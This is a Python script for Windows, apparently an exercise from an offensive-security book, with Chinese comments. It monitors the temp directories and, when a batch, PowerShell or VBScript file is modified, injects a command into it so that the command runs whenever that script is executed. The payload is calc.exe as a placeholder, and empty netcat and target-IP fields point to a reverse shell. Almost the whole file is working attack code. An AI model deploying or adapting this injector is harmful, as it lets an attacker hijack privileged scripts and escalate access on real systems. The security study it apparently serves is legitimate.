import os
import tempfile  # tempfile模块用于生成临时文件和目录
import threading
import win32con
import win32file


FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

# FILE_LIST_DIRECTORY 1 对于目录，是列出目录内容的权限
FILE_LIST_DIRECTORY = 0x0001
# tempfile.gettempdir()返回放置临时文件的目录的名称
# 设定要监控的文件夹列表
PATHS = ['c:\\WINDOWS\\Temp', tempfile.gettempdir()]

NETCAT = ''
TARGET_IP = ''
CMD = 'calc.exe'

FILE_TYPES = {
    '.bat': ["\r\nREM bhpmarker\r\n", f'\r\n{CMD}\r\n'],
    '.ps1': ["\r\n#bhpmarker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
    '.vbs': ["\r\n'bhpmarker\r\n", f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n'],
}


def inject_code(full_name, contents, extension):
    if FILE_TYPES[extension][0].strip() in contents:
        return

    full_contents = FILE_TYPES[extension][0]
    full_contents += FILE_TYPES[extension][1]
    full_contents += contents
    with open(full_name, 'w') as f:
        f.write(full_contents)
    print('\\o/ Inject Code.')


def monitory(path_to_watch):
    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE |
        win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        # 必须设置此标志才能获取目录的句柄。 目录句柄可以传递给某些函数，而不是文件句柄
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
    )
    while True:
        try:
            # ReadDirectoryChangesW 返回目录中发生的更改的信息。
            # 返回值是a list of (action, filename)
            results = win32file.ReadDirectoryChangesW(
                h_directory,  # 要监视的目录句柄。该目录必须以FILE_LIST_DIRECTORY访问权限打开。
                1024,  # 为结果分配的缓冲区的大小。
                True,  # 是否监视子目录
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY |
                win32con.FILE_NOTIFY_CHANGE_SIZE,  # 监视条件
                None,
                None
            )
            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                if action == FILE_CREATED:
                    print(f'[+] Created {full_filename}')
                elif action == FILE_DELETED:
                    print(f'[-] Deleted {full_filename}')
                elif action == FILE_MODIFIED:
                    # print(f'[*] Modified {full_filename}')
                    # try:
                    #     print('[vvv] Dumping contents...')
                    #     with open(full_filename) as f:
                    #         contents = f.read()
                    #     print(contents)
                    #     print('[^^^] Dump complete.')
                    # except Exception as e:
                    #     print(f'[!!!] Dump failed. {e}')

                    extension = os.path.splitext(full_filename)[1]

                    if extension in FILE_TYPES:
                        print(f'[*] Modified {full_filename}')
                        print('[vvv] Dumping contents...')
                        try:
                            with open(full_filename) as f:
                                contents = f.read()

                            # 注入代码
                            inject_code(full_filename, contents, extension)
                            print(contents)
                            print('[^^^] Dump compltes.')
                        except Exception as e:
                            print(f'[!!!] Dump failed. {e}')

                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from {full_filename}')
                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to {full_filename}')
                else:
                    print(f'[?] Unknow action on {full_filename}')
        except Exception:
            print(f'Cant monitor directory -> {path_to_watch}')


if __name__ == '__main__':
    for path in PATHS:
        monitor_thread = threading.Thread(target=monitory, args=(path, ))
        monitor_thread.start()

